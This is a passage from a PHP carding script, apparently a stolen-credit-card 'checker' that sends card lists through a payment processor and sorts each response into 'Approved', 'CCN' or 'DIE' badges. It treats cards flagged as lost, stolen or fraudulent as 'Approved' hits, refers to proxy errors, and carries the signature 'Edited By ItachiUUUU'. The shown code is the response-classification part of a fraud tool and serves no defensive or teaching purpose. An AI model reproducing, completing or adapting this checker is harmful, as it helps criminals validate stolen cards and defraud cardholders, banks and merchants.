    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV)</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Fraudulent Card</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,'"type":"one-time"')){
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">Approved (͏CVV)</span> </span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Insufficient Funds</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Insufficient Funds</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "lost_card" )) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Lost Card</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Stolen Card </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "The card's security code is incorrect." )) {
    echo '<span class="badge badge-success">#CCN</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">CCN</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">#</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">CCN</span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">CCN</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> CCN </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-success">#Approved</span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Pickup Card (Reported Stolen Or Lost) </span></span> <span class="badge badge-warning"> '.$amount.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Expired Card</span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Expired Card </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Incorrect Card Number</span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Incorrect Card Number </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "service_not_allowed")) {
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Service Not Allowed</span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "do_not_honor")) {
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Declined : Do_Not_Honor </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Card Declined </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "generic_decline")) {
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Declined : Generic_Decline </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> CVC_Check : Unavailable </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> CVC_Unchecked : Proxy Error </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> CVC_Unchecked : Fail </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Declined : Missing Card Details</span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,"lock_timeout")){
    echo '<span class="badge badge-danger">#DIE</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Another Request In Process : Card Not Checked </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Card Doesnt Support Purchase </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,"transaction_not_allowed")){
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Card Doesnt Support Purchase </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,"three_d_secure_redirect")){
     echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Card Doesnt Support Purchase </span> </span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> 3D Secure Redirect </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result,"missing_payment_information")){
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Missing Payment Informations </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Missing Credit Card Number </span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
elseif(isset($json2['error']['code'])) {
   echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning">'.$error2.'</span></span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span> </br>';
}
else {
    echo '<span class="badge badge-danger">#DIE</span></span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-info"> Itachi </span> <span class="badge badge-warning"> Dead Proxy/Error Not listed </span> </span> <span class="badge badge-warning"> '.$amount2.' </span> <span class="badge badge-info"> '.$ttc.' </span></span> </br>';
}
if ($cvvpass == false) {

    echo '<span class="badge badge-info"> CVV Code: Not Matched </span><span class="badge badge-info">'.$response.'</span></br>';
}
else  {
  echo '<span class="badge badge-info"> CVV Code: '.$cvvpass.' '.$response.' </span></br>';
}
////////////////////////////////////////

curl_close($ch);
ob_flush();
//////////////[Echo Result]///////////
//echo $result;

///////////////////////////////////////////////===========================Edited By ItachiUUUU================================================\\\\\\\\\\\\\\\
?>